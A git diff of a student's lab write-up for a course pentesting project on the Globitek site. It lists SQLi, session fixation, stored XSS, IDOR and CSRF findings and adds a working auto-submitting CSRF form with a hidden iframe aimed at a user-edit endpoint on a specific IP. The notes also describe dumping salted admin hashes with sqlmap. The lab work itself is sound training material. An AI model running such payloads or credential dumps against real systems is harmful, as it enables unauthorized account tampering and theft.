@@ -1,10 +1,8 @@
 # Project 8 - Pentesting Live Targets
 
-Time spent: **20** hours spent in total
+Time spent: **25** hours spent in total
 
 > Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.
-
-IP Address: https://104.197.43.145
 
 The six possible exploits are:
 * Username Enumeration
@@ -22,8 +20,9 @@ Vulnerability #1: SQLi - The id parameter is unsanitized and escapable on the sa
 
 GIF Walkthrough: <img src='http://i.imgur.com/qaOIRtL.gif' />
 
-Vulnerability #2: __________________
+Vulnerability #2: Session Hijacking/Fixation - A new session ID isn't regenerated when loging back in.
 
+GIF Walkthrough: <img src='http://i.imgur.com/2tWbuTi.gif' />
 
 ## Green
 
@@ -31,7 +30,9 @@ Vulnerability #1: Username Enumeration - Error message switches between bold and
 
 GIF Walkthrough: <img src='http://i.imgur.com/UYoccrU.gif' />
 
-Vulnerability #2: __________________
+Vulnerability #2: Stored XSS - The Name and Feedback fields on the feedback page are unsanitized. Guest can send malicious messages with embedded JS that will trigger once opened.
+
+GIF Walkthrough: <img src='http://i.imgur.com/o1zsKGH.gif' />
 
 
 ## Red
@@ -40,14 +41,39 @@ Vulnerability #1: IDOR - Hidden salespeople ids are accessible
 
 GIF Walkthrough: <img src='http://i.imgur.com/lnQoU8t.gif' />
 
-Vulnerability #2: __________________
+Vulnerability #2: CSFR - CSFR tokens are not used in the edit pages
+
+GIF Walkthrough: <img src='http://i.imgur.com/qoO6YKA.gif' />
 
 
 ## Notes
 
 Describe any challenges encountered while doing the work
 
-Could not do XSS, CSRF, or Session Hijacking/Fixation due to the exploits requring admin login. The hashed passwords were obtained from the database using sqlmap but the passwords are salted. The default Sqlmap version was also outdated and didn't work; had to install updated version from the official github link.
+CSRF Test Form:
+
+```
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1> Don't Worry! This site is doing absolutely nothing suspicious! >:) </h1>
+
+<!-- iframe holds the redirected page after submittion and is hidden from the unsuspecting victim -->
+<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
+
+<form name="csrfForm" action="https://104.154.233.91/red/public/staff/users/edit.php?id=4" target="dummyframe" method="POST">
+ <input type="hidden" name="first_name" value="CSRF" />
+ <input type="hidden" name="last_name" value="Successful" />
+</form>
+<script>document.csrfForm.submit(); </script>
+
+</body>
+</html>
+```
+Bonus 1 Task:
+
+The admin login credentials were left out accidently at first and it wasn't possible to login. Before the neccessary admin credentials were provided, the database was exposed using Sqlmap to obtained the admin credentials from the users table. The hashed passwords were obtained but the passwords were salted. With no information on what the salt values could be, decrypting the hashed passwords was almost impossible. Although this prodecure didn't result in successfully loging into the admin page, learning how to use Sqlmap in such a circumstance was a very insightful experience. The default Sqlmap version was also outdated and didn't work; had to install updated version from the official github link.
 
 Sqlmap Installation Command:
 
